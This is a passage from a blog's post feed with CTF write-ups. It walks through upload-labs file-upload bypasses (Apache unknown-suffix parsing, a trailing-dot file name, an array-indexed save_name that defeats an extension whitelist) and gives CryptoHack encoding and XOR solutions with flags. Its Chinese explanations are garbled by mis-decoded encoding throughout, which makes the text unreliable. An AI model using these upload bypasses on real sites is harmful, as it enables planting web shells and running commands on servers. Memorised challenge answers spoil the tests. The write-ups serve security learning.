class="hljs-keyword">case</span> <span class="hljs-string">&quot;SUCCESS&quot;</span>                  : <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_verbal == <span class="hljs-number">0</span> ) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Upload was successful!&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span> : <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OUPS!! We do not know what happen, you should fire the programmer ;)&quot;</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br><br>&#125;; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆæ£€æŸ¥æ‹“å±•ï¼Œå†ä¸Šä¼ ï¼Œç„¶åç§»åŠ¨æ–‡ä»¶å†æ”¹å</p><p><img src="/../images/upload-labs/pass_19_1.png"></p><p>åˆ©ç”¨Apacheçš„é™Œç”Ÿåç¼€è§£æç»•è¿‡ï¼Œä¸Šä¼ test.php.7z</p><p>bpæŠ“åŒ…ï¼Œæ·»åŠ ä¸€ä¸ªæ— å…³ç´§è¦çš„å‚æ•°æ§åˆ¶çˆ†ç ´æ¬¡æ•°</p><p><img src="/../images/upload-labs/pass_19_2.png"></p><p>æˆåŠŸè§£æ</p><p><img src="/../images/upload-labs/pass_19_3.png"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>ä¿å­˜åç§°æ”¹ä¸ºâ€œupload-19.php.â€</p><p>ä¸Šä¼ test.php</p><p>å°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_20_1.png"></p><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>ä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//æ£€æŸ¥MIME</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//æ£€æŸ¥æ–‡ä»¶å</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆæ£€æŸ¥MIMEç±»å‹æ˜¯å¦ä¸ºå›¾åƒ</p><p>ç„¶åæ£€æŸ¥postè¡¨å•ä¸­æ˜¯å¦æœ‰save_nameï¼Œæ²¡æœ‰å°±å°†ä¸Šä¼ çš„æ–‡ä»¶åèµ‹ç»™$fileï¼Œå¦åˆ™å°±å°†save_nameèµ‹ç»™$file</p><p>å†æ£€æŸ¥$fileæ˜¯ä¸æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœä¸æ˜¯å°±ç”¨explode()ä»¥â€œ.â€ä½œä¸ºåˆ†å‰²ç¬¦å°†è½¬ä¸ºå°å†™åçš„$fileåˆ†å‰²ä¸ºä¸€ä¸ªæ•°ç»„</p><p>æ¥ä¸‹æ¥å°†æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ èµ‹ç»™$extä½œä¸ºæ‹“å±•åï¼Œç„¶åæ£€æŸ¥$extæ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œä¸åœ¨åˆ™ç¦æ­¢ä¸Šä¼ </p><p>å°†$fileæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ä½œä¸ºæ–‡ä»¶åå’Œæœ€åä¸€ä¸ªå€¼ä½œä¸ºæ–‡ä»¶æ‹“å±•åèµ‹ç»™$file_nameï¼Œå¹¶å°†æ–‡ä»¶ä¸Šä¼ åˆ°UPLOAD_PATH&#x2F;$filename</p><p>å…³é”®åœ¨äºå¦‚ä½•æ„é€ $fileæ•°ç»„</p><p>ä¸Šä¼ test.jpgï¼ŒbpæŠ“åŒ…ï¼Œå°†save_nameæ”¹ä¸ºæœ‰ä¸¤ä¸ªå€¼çš„æ•°ç»„ï¼Œä½†æ˜¯ä¸‹æ ‡è®¾ä¸º0å’Œ2ï¼Œè¿™æ ·åœ¨ä¸º$file_nameèµ‹å€¼æ—¶ï¼Œ$file[count($file)-1]ä¸º$file[1]ä¸ºç©ºï¼Œé‚£ä¹ˆ$file_nameçš„å€¼ä¸º$file[0]åŠ ä¸Šâ€œ.â€ï¼Œç”±äºwindowsç‰¹æ€§ï¼Œæ–‡ä»¶åå®é™…å°±æ˜¯$file[0]</p><p><img src="/../images/upload-labs/pass_21_1.png"></p><p>å°è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="/../images/upload-labs/pass_21_2.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>file_uploads</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cryptohack</title>
    <link href="/2025/07/12/cryptohack/"/>
    <url>/2025/07/12/cryptohack/</url>
    
    <content type="html"><![CDATA[<h2 id="general"><a href="#general" class="headerlink" title="general"></a>general</h2><h3 id="encoding"><a href="#encoding" class="headerlink" title="encoding"></a>encoding</h3><h4 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h4><blockquote><p>ASCII æ˜¯ä¸€ç§ 7 ä½ç¼–ç æ ‡å‡†ï¼Œå…è®¸ä½¿ç”¨æ•´æ•° 0-127 è¡¨ç¤ºæ–‡æœ¬ã€‚</p><p>åœ¨ Python ä¸­ï¼Œè¯¥ <code>chr()</code> å‡½æ•°å¯ç”¨äºå°† ASCII åºæ•°è½¬æ¢ä¸ºå­—ç¬¦ï¼ˆè¯¥ <code>ord()</code> å‡½æ•°çš„ä½œç”¨ç›¸åï¼‰ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">arr = [<span class="hljs-number">99</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">112</span>, <span class="hljs-number">116</span>, <span class="hljs-number">111</span>, <span class="hljs-number">123</span>, <span class="hljs-number">65</span>, <span class="hljs-number">83</span>, <span class="hljs-number">67</span>, <span class="hljs-number">73</span>, <span class="hljs-number">73</span>, <span class="hljs-number">95</span>, <span class="hljs-number">112</span>, <span class="hljs-number">114</span>, <span class="hljs-number">49</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">52</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">51</span>, <span class="hljs-number">125</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> arr:<br>    flag += <span class="hljs-built_in">chr</span>(c)<br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#  crypto&#123;ASCII_pr1nt4bl3&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Hex"><a href="#Hex" class="headerlink" title="Hex"></a>Hex</h4><blockquote><p>å½“æˆ‘ä»¬åŠ å¯†æŸäº›å†…å®¹æ—¶ï¼Œç”Ÿæˆçš„å¯†æ–‡é€šå¸¸åŒ…å«ä¸å¯æ‰“å°çš„ ASCII å­—ç¬¦çš„å­—èŠ‚ã€‚å¦‚æœæˆ‘ä»¬æƒ³å…±äº«æˆ‘ä»¬çš„åŠ å¯†æ•°æ®ï¼Œé€šå¸¸ä¼šå°†å…¶ç¼–ç ä¸ºæ›´ç”¨æˆ·å‹å¥½ä¸”åœ¨ä¸åŒç³»ç»Ÿä¹‹é—´å¯ç§»æ¤çš„æ•°æ®ã€‚åå…­è¿›åˆ¶å¯ä»¥ä»¥è¿™ç§æ–¹å¼ç”¨äºè¡¨ç¤º ASCII å­—ç¬¦ä¸²ã€‚</p><p>åœ¨ Python ä¸­ï¼Œè¯¥ <code>bytes.fromhex()</code> å‡½æ•°å¯ç”¨äºå°†åå…­è¿›åˆ¶è½¬æ¢ä¸ºå­—èŠ‚ã€‚å¯ä»¥åœ¨å­—èŠ‚å­—ç¬¦ä¸²ä¸Šè°ƒç”¨ <code>.hex()</code> instance æ–¹æ³•ä»¥è·å–åå…­è¿›åˆ¶è¡¨ç¤ºå½¢å¼ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d&quot;</span>))<br><br><span class="hljs-comment">#  b&#x27;crypto&#123;You_will_be_working_with_hex_strings_a_lot&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h4><blockquote><p>å¦ä¸€ç§å¸¸è§çš„ç¼–ç æ–¹æ¡ˆæ˜¯ Base64ï¼Œå®ƒå…è®¸æˆ‘ä»¬ä½¿ç”¨ 64 ä¸ªå­—ç¬¦çš„å­—æ¯å°†äºŒè¿›åˆ¶æ•°æ®è¡¨ç¤ºä¸º ASCII å­—ç¬¦ä¸²ã€‚Base64 å­—ç¬¦ä¸²çš„ä¸€ä¸ªå­—ç¬¦ç¼–ç  6 ä¸ªäºŒè¿›åˆ¶æ•°å­— ï¼ˆbitï¼‰ï¼Œå› æ­¤ Base64 çš„ 4 ä¸ªå­—ç¬¦ç¼–ç  3 ä¸ª 8 ä½å­—èŠ‚ã€‚</p><p>Base64 æ˜¯åœ¨çº¿æœ€å¸¸ç”¨çš„ï¼Œå› æ­¤å›¾åƒç­‰äºŒè¿›åˆ¶æ•°æ®å¯ä»¥è½»æ¾åŒ…å«åœ¨ HTML æˆ– CSS æ–‡ä»¶ä¸­ã€‚</p><p>åœ¨ Python ä¸­ï¼Œä½¿ç”¨ <code>import base64</code> å¯¼å…¥ base64 æ¨¡å—åï¼Œå¯ä»¥ä½¿ç”¨è¯¥ <code>base64.b64encode()</code> å‡½æ•°ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>flag = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;72bca9b68fc16ac7beeb8f849dca1d8a783e8acf9679bf9269f7bf&quot;</span>)<br><br><span class="hljs-built_in">print</span>(base64.b64encode(flag))<br><br><span class="hljs-comment">#  b&#x27;crypto/Base+64+Encoding+is+Web+Safe/&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="Bytes-and-Integers"><a href="#Bytes-and-Integers" class="headerlink" title="Bytes and Integers"></a>Bytes and Integers</h4><blockquote><p>åƒ RSA è¿™æ ·çš„åŠ å¯†ç³»ç»Ÿå¯ä»¥å¤„ç†æ•°å­—ï¼Œä½†æ¶ˆæ¯æ˜¯ç”±å­—ç¬¦ç»„æˆçš„ã€‚æˆ‘ä»¬åº”è¯¥å¦‚ä½•å°†æˆ‘ä»¬çš„æ¶ˆæ¯è½¬æ¢ä¸ºæ•°å­—ï¼Œä»¥ä¾¿å¯ä»¥åº”ç”¨æ•°å­¦è¿ç®—ï¼Ÿ</p><p>æœ€å¸¸è§çš„æ–¹æ³•æ˜¯è·å–æ¶ˆæ¯çš„åºå·å­—èŠ‚ï¼Œå°†å®ƒä»¬è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œç„¶åè¿æ¥èµ·æ¥ã€‚è¿™å¯ä»¥è§£é‡Šä¸º base-16&#x2F;åå…­è¿›åˆ¶æ•°ï¼Œä¹Ÿå¯ä»¥ç”¨ base-10&#x2F;decimal è¡¨ç¤ºã€‚</p><p>Python çš„ PyCryptodome åº“ä½¿ç”¨æ–¹æ³• <code>bytes_to_long()</code> å’Œ <code>long_to_bytes()</code> æ¥å®ç°è¿™ä¸€ç‚¹ã€‚é¦–å…ˆå¿…é¡»å®‰è£… PyCryptodome å¹¶ä½¿ç”¨ <code>from Crypto.Util.number import *</code></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>s = <span class="hljs-number">11515195063862318899931685488813747395775516287289682636499965282714637259206269</span><br><br><span class="hljs-built_in">print</span>(long_to_bytes(s))<br><br><span class="hljs-comment">#  b&#x27;crypto&#123;3nc0d1n6_4ll_7h3_w4y_d0wn&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="Encoding-Challenge"><a href="#Encoding-Challenge" class="headerlink" title="Encoding Challenge"></a>Encoding Challenge</h4><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><h4 id="XOR-Starter"><a href="#XOR-Starter" class="headerlink" title="XOR Starter"></a>XOR Starter</h4><blockquote><p>XOR æ˜¯ä¸€ä¸ªæŒ‰ä½è¿ç®—ç¬¦ï¼Œå¦‚æœä½ç›¸åŒï¼Œåˆ™è¿”å› 0ï¼Œå¦åˆ™è¿”å› 1ã€‚åœ¨æ•™ç§‘ä¹¦ä¸­ï¼ŒXOR è¿ç®—ç¬¦ç”¨ âŠ• è¡¨ç¤ºï¼Œä½†åœ¨å¤§å¤šæ•°æŒ‘æˆ˜å’Œç¼–ç¨‹è¯­è¨€ä¸­ï¼Œä½ ä¼šçœ‹åˆ° <code>^</code> ä½¿ç”¨æ’å…¥ç¬¦å·ã€‚</p><p>å¯¹äºè¾ƒé•¿çš„äºŒè¿›åˆ¶æ•°ï¼Œæˆ‘ä»¬é€ä½è¿›è¡Œ XORï¼š <code>0110 ^ 1010 = 1100</code> ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡é¦–å…ˆå°†æ•´æ•°ä»åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ¥å¯¹æ•´æ•°è¿›è¡Œ XOR è¿ç®—ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡é¦–å…ˆå°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸ºè¡¨ç¤º Unicode å­—ç¬¦çš„æ•´æ•°æ¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œ XOR è¿ç®—ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;label&quot;</span><br>new_s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>    new_s += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c)^<span class="hljs-number">13</span>)<br><span class="hljs-built_in">print</span>(new_s)<br></code></pre></td></tr></table></figure><p>ç”¨pwntoolsåº“ä¸­çš„xor()å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><br>s = <span class="hljs-string">&quot;label&quot;</span><br>new_s = xor(s.encode(), <span class="hljs-number">13</span>)<br><span class="hljs-built_in">print</span>(new_s.decode())<br><br><span class="hljs-comment">#  aloha</span><br></code></pre></td></tr></table></figure><h4 id="XOR-Properties"><a href="#XOR-Properties" class="headerlink" title="XOR Properties"></a>XOR Properties</h4><blockquote><p>å½“æˆ‘ä»¬ä½¿ç”¨ XOR è¿ç®—ç¬¦è§£å†³æŒ‘æˆ˜æ—¶ï¼Œæˆ‘ä»¬åº”è¯¥è€ƒè™‘å››ä¸ªä¸»è¦å±æ€§</p><p>äº¤æ¢ï¼šA âŠ• B &#x3D; B âŠ• A</p><p>ç»“åˆï¼šA âŠ• ï¼ˆB âŠ• Cï¼‰ &#x3D; ï¼ˆA âŠ• Bï¼‰ âŠ• C</p><p>å•ä½å…ƒï¼šA âŠ• 0 &#x3D; A</p><p>è‡ªé€†ï¼šA âŠ• A &#x3D; 0</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><br>key1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313&quot;</span>)<br>key2_xor_key3 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1&quot;</span>)<br>flag_xor_all = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf&quot;</span>)<br><br>flag = xor(key1, key2_xor_key3, flag_xor_all)<br><br><span class="hljs-built_in">print</span>(flag.decode())<br><br><span class="hljs-comment">#  crypto&#123;x0r_i5_ass0c1at1v3&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Favourite-byte"><a href="#Favourite-byte" class="headerlink" title="Favourite byte"></a>Favourite byte</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">ciphertext = <span class="hljs-string">&quot;73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d&quot;</span><br>cipher_bytes = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext)<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    decrypted = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b^key) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> cipher_bytes)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;crypto&#x27;</span> <span class="hljs-keyword">in</span> decrypted:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;key:<span class="hljs-subst">&#123;key&#125;</span>, flag:<span class="hljs-subst">&#123;decrypted&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#  key:16, flag:crypto&#123;0x10_15_my_f4v0ur173_by7e&#125;</span><br></code></pre></td></tr></table></figure><h4 id="You-either-know-XOR-you-donâ€™t"><a href="#You-either-know-XOR-you-donâ€™t" class="headerlink" title="You either know, XOR you donâ€™t"></a>You either know, XOR you donâ€™t</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">ciphertext = <span class="hljs-string">&#x27;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&#x27;</span><br>cipher_bytes = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext)<br><br>flag_prefix = <span class="hljs-string">b&quot;crypto&#123;&quot;</span><br><br>key_prefix = [c^p <span class="hljs-keyword">for</span> c, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cipher_bytes[:<span class="hljs-number">7</span>], flag_prefix)]<br>key = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(key_prefix[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key_prefix)))<br><span class="hljs-comment"># print(key) ==&gt; &#x27;myXORke&#x27;</span><br>key += <span class="hljs-string">&#x27;y&#x27;</span><br>key_bytes = key.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>l= <span class="hljs-built_in">len</span>(key_bytes)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(c^(key_bytes[i%l])) <span class="hljs-keyword">for</span> i,c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(cipher_bytes))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;key:<span class="hljs-subst">&#123;key&#125;</span>, flag:<span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#  key:myXORkey, flag:crypto&#123;1f_y0u_Kn0w_En0uGH_y0u_Kn0w_1t_4ll&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Lemur-XOR"><a href="#Lemur-XOR" class="headerlink" title="Lemur XOR"></a>Lemur XOR</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>img1 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>)<br>img2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;lemur.png&quot;</span>)<br><br><span class="hljs-comment">#  å°†å›¾åƒè½¬ä¸ºNumpyæ•°ç»„</span><br>arr1 = np.array(img1)<br>arr2 = np.array(img2)<br><br><span class="hljs-comment">#  æ‰§è¡Œå¼‚æˆ–æ“ä½œ</span><br>res_arr = np.bitwise_xor(arr1, arr2)<br><span class="hljs-comment">#  åˆ›å»ºæ–°çš„å›¾åƒ</span><br>res_img = Image.fromarray(res_arr)<br><br>res_img.save(<span class="hljs-string">&quot;result.png&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../images/cryptohack/xor.png"></p>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LitCTF2025_web</title>
    <link href="/2025/05/28/LitCTF2025-web/"/>
    <url>/2025/05/28/LitCTF2025-web/</url>
    
